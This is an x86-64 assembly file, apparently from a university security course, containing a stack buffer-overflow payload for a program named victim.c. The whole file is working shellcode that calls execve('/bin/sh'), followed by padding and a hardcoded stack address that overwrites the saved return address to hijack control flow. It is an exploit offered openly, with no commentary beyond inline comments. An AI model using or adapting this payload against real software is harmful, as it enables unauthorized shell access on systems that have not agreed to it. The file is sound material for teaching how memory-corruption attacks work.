/* victim.c */
/* Author: Zecheng He @ Princeton University */
/* Payload (write to stack) to invoke a shell in victim.c */

#include <sys/syscall.h>

#define buffer_ptr_h 0x7fff
#define buffer_ptr_l 0xffffdf40
#define STRING_LEN 7
#define ARG3_OFFSET (STRING_LEN+1)
#define ARG4_OFFSET (ARG3_OFFSET+8)
#define PAYLOAD_INSTRUCTION_BYTES 61

#define ADD(X, Y) (X + Y)
#define EXECVE_SYSCALL 59
#define EXIT_SYSCALL 60

.globl main
        .type   main, @function

main:

        xor     %rcx, %rcx
        xor     $buffer_ptr_h, %cx
        shl     $32, %rcx

        xor     %rax, %rax
        xor     $ADD(buffer_ptr_l, PAYLOAD_INSTRUCTION_BYTES), %eax     /* lower part of ptr to str "/bin/sh" */
        xor     %rax, %rcx                                              /* ptr to str "/bin/sh" */

        xor     %rax, %rax
        mov     %al, STRING_LEN(%rcx)                                   /* Add '\0' to "/bin/sh" */
        movq    %rcx, ARG3_OFFSET(%rcx)                                 /* Ptr to ['/bin/sh'] */
        movq    %rax, ARG4_OFFSET(%rcx)                                 /* NULL pointer */

        mov     $EXECVE_SYSCALL, %al                                    /* syscall arg 1: syscall number execve(59) */
        movq    %rcx, %rdi                                              /* syscall arg 2: string pathname */
        leaq    ARG3_OFFSET(%rcx), %rsi                                 /* syscall arg 3: argv ptr to ['/bin/sh']*/
        xor     %rdx, %rdx                                              /* syscall arg 4: envp (NULL) */
        syscall                                                         /* Call execve("/bin/sh", ["/bin/sh"], []) */

        xor     %rax, %rax
        mov     $EXIT_SYSCALL, %al                                      /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                                               /* syscall arg 2: 0 */
        syscall                                                         /* invoke syscall */

        .ascii  "/bin/sh"
        .ascii  "aaaa"                                                  /* pad to overwrite return address */
        .ascii  "bbbb"                                                  /* pad to overwrite return address */
        .ascii  "cccc"                                                  /* pad to overwrite return address */
        .ascii  "dddd"                                                  /* pad to overwrite return address */
        .ascii  "eeee"                                                  /* pad to overwrite return address */
        .long   buffer_ptr_l                                            /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
        .long   buffer_ptr_h                                            /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
